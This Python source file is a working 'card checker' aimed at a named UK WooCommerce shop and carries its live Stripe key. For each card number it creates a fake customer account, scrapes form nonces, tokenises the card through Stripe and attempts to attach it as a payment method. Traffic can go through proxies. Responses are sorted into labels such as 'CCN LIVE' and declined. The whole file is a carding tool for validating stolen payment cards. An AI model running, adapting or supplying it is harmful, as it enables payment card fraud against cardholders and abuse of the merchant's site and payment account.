"""
Stripe Auth Gate 1 — WooCommerce + Stripe (createAndConfirmSetupIntent)
Site: alltheaunties.co.uk
PK: pk_live_51TBZeKGUqk6qSQO3mzQy49WE2TXnuaHVipoKYRTYf9SSRy9RKXZ54xbJJwjfS9ruUSx11EdQFizBpEsLxG6TSZmC00BeTyv3TO

Flow:
  1. GET /my-account/ → extract register nonce
  2. POST register → get WP cookies
  3. GET /my-account/add-payment-method/ → extract setupIntent nonce
  4. POST Stripe API → create payment method (pm_xxx)
  5. POST wc-ajax/admin-ajax → confirm setup intent → get result
"""

import re
import uuid
import string
import random
import aiohttp


SITE = "https://alltheaunties.co.uk"
STRIPE_PK = "pk_live_51TBZeKGUqk6qSQO3mzQy49WE2TXnuaHVipoKYRTYf9SSRy9RKXZ54xbJJwjfS9ruUSx11EdQFizBpEsLxG6TSZmC00BeTyv3TO"

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"


def _rand_str(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _extract_error(text: str) -> str:
    """Extract error message from Stripe/WC response."""
    # Try decline_code first (most specific)
    m = re.search(r'"decline_code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    # Try error message
    m = re.search(r'"message"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1)
    # Try error code
    m = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    return ''


async def stripe_auth1_check(card_str: str, proxy_str=None):
    """
    Stripe Auth Gate 1 — alltheaunties.co.uk (WooCommerce + Stripe SetupIntent)

    Args:
        card_str: Card in cc|mm|yy|cvv format
        proxy_str: Optional proxy URL

    Returns:
        dict with Response, Gateway, Price keys
    """
    try:
        parts = card_str.strip().split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Gateway": "Stripe-Auth1", "Price": "$0"}
        cc, mm, yy, cvv = parts
        cc = cc.strip().replace(' ', '')
        mm = mm.strip().zfill(2)
        yy = yy.strip()
        cvv = cvv.strip()
        if len(yy) == 2:
            yy = '20' + yy

        rand = _rand_str(10)
        email = f"{rand}@gmail.com"
        gu = str(uuid.uuid4())
        mu = str(uuid.uuid4())
        si = str(uuid.uuid4())

        headers_site = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }

        timeout = aiohttp.ClientTimeout(total=45)
        jar = aiohttp.CookieJar(unsafe=True)
        proxy_url = proxy_str if proxy_str else None

        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:

            # ─── Step 1: GET /my-account/ → extract register nonce ───
            reg_nonce = None
            for path in ['/my-account/', '/my-account-2/', '/register/']:
                try:
                    async with session.get(
                        f"{SITE}{path}",
                        headers=headers_site,
                        ssl=False,
                        allow_redirects=True,
                        proxy=proxy_url
                    ) as resp:
                        page_text = await resp.text()

                    for pattern in [
                        r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                        r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                        r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                    ]:
                        match = re.search(pattern, page_text)
                        if match:
                            reg_nonce = match.group(1)
                            break
                    if reg_nonce:
                        break
                except Exception:
                    continue

            if not reg_nonce:
                return {"Response": "Register nonce not found", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # ─── Step 2: Register account ───
            reg_data = {
                'email': email,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
                'woocommerce-register-nonce': reg_nonce,
            }

            reg_headers = {
                "User-Agent": UA,
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": SITE,
                "Referer": f"{SITE}/my-account/",
            }

            try:
                async with session.post(
                    f"{SITE}/my-account/",
                    data=reg_data,
                    headers=reg_headers,
                    ssl=False,
                    allow_redirects=True,
                    proxy=proxy_url
                ) as resp:
                    await resp.text()
            except Exception as e:
                return {"Response": f"Registration failed: {str(e)[:60]}", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # Verify login
            cookies = {c.key: c.value for c in jar}
            logged_in = any('wordpress_logged_in' in k for k in cookies)
            if not logged_in:
                return {"Response": "Registration failed: No login cookie", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # ─── Step 3: GET /my-account/add-payment-method/ → extract setup intent nonce ───
            nonce = None
            for path in [
                '/my-account/add-payment-method/',
                '/my-account/payment-methods/',
                '/checkout/',
                '/my-account/',
            ]:
                try:
                    async with session.get(
                        f"{SITE}{path}",
                        headers=headers_site,
                        ssl=False,
                        allow_redirects=True,
                        proxy=proxy_url
                    ) as resp:
                        page_text = await resp.text()

                    for pattern in [
                        r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
                        r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
                        r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                        r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
                        r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
                        r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                    ]:
                        match = re.search(pattern, page_text)
                        if match:
                            nonce = match.group(1)
                            break
                    if nonce:
                        break
                except Exception:
                    continue

            if not nonce:
                return {"Response": "Setup intent nonce not found", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # ─── Step 4: Create PaymentMethod via Stripe API ───
            stripe_headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "User-Agent": UA,
            }

            stripe_data = (
                f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}"
                f"&allow_redisplay=unspecified&billing_details[address][postal_code]=10080"
                f"&billing_details[address][country]=US&billing_details[name]=John%20Doe"
                f"&billing_details[email]={email}"
                f"&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent"
                f"&referrer=https%3A%2F%2Falltheaunties.co.uk"
                f"&time_on_page={random.randint(20000, 50000)}"
                f"&guid={gu}&muid={mu}&sid={si}&key={STRIPE_PK}"
                f"&_stripe_version=2024-06-20"
            )

            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_data,
                headers=stripe_headers,
                ssl=False,
                proxy=proxy_url
            ) as resp:
                stripe_text = await resp.text()

            # Check for Stripe tokenization errors
            try:
                import json
                stripe_json = json.loads(stripe_text)
            except Exception:
                stripe_json = {}

            if 'error' in stripe_json:
                err = stripe_json['error']
                decline_code = err.get('decline_code', '')
                err_msg = err.get('message', '')
                err_code = err.get('code', '')
                display = decline_code or err_code or err_msg or 'TOKENIZATION_FAILED'
                return {"Response": display, "Gateway": "Stripe-Auth1", "Price": "$0"}

            pm_id = stripe_json.get('id', '')
            if not pm_id or not pm_id.startswith('pm_'):
                return {"Response": "No payment method ID returned", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # ─── Step 5: Confirm setup intent via WC AJAX ───
            confirm_headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": UA,
                "Origin": SITE,
                "Referer": f"{SITE}/my-account/add-payment-method/",
            }

            confirm_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            # Try both endpoint patterns (wc-ajax and admin-ajax)
            result_text = ''
            for ep_url, ep_params, ep_data in [
                (
                    f"{SITE}/",
                    {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                    {
                        'action': 'create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': nonce,
                    }
                ),
                (
                    f"{SITE}/wp-admin/admin-ajax.php",
                    {},
                    {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': nonce,
                    }
                ),
            ]:
                try:
                    async with session.post(
                        ep_url,
                        params=ep_params,
                        headers=confirm_headers,
                        data=ep_data,
                        ssl=False,
                        proxy=proxy_url
                    ) as resp:
                        result_text = await resp.text()
                        if resp.status == 200 and len(result_text) > 5:
                            break
                except Exception:
                    continue

            if not result_text:
                return {"Response": "No response from setup intent", "Gateway": "Stripe-Auth1", "Price": "$0"}

            # ─── Classify final response ───
            return _classify_stripe_response(result_text)

    except aiohttp.ClientError as e:
        return {"Response": f"Connection error: {str(e)[:60]}", "Gateway": "Stripe-Auth1", "Price": "$0"}
    except Exception as e:
        return {"Response": f"Exception: {str(e)[:80]}", "Gateway": "Stripe-Auth1", "Price": "$0"}


def _classify_stripe_response(result_text: str) -> dict:
    """Classify the WooCommerce Stripe setup intent response."""
    rl = result_text.lower()

    # Extract error info for all paths
    err_msg = _extract_error(result_text)

    # ── SUCCESS: Card authenticated / added ──
    if any(k in rl for k in [
        '"success":true', '"status":"succeeded"',
        'payment method added', 'payment_method_added',
    ]):
        # Double-check for hidden decline inside success wrapper
        if 'decline' in rl or 'card_declined' in rl:
            return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth1", "Price": "$0"}
        return {"Response": "Payment Method Added Successfully", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── 3DS / AUTH REQUIRED ──
    if any(k in rl for k in [
        'requires_action', 'authentication_required', '3d_secure',
        '"status":"requires_confirmation"', 'redirect_to_url',
    ]):
        return {"Response": "3DS Authentication Required", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── LIVE CARD SIGNALS (bank responded) ──
    if any(k in rl for k in [
        'incorrect_cvc', 'incorrect_zip', 'insufficient_funds',
        'invalid_cvc', 'cvc_check_failed',
    ]):
        return {"Response": err_msg or "CCN LIVE", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── HARD DECLINES ──
    if any(k in rl for k in [
        'card_declined', 'generic_decline', 'do_not_honor',
        'fraudulent', 'lost_card', 'stolen_card',
        'pickup_card', 'restricted_card',
        'transaction_not_allowed', 'security_violation',
    ]):
        return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── EXPIRED ──
    if 'expired_card' in rl or 'expired' in rl:
        return {"Response": "EXPIRED_CARD", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── VELOCITY ──
    if any(k in rl for k in ['velocity', 'too_many', 'rate_limit']):
        return {"Response": err_msg or "VELOCITY_EXCEEDED", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── ERROR RESPONSE ──
    if '"success":false' in rl or '"error"' in rl:
        return {"Response": err_msg or "Unknown Error", "Gateway": "Stripe-Auth1", "Price": "$0"}

    # ── FALLBACK ──
    if err_msg:
        return {"Response": err_msg, "Gateway": "Stripe-Auth1", "Price": "$0"}

    return {"Response": result_text[:120], "Gateway": "Stripe-Auth1", "Price": "$0"}
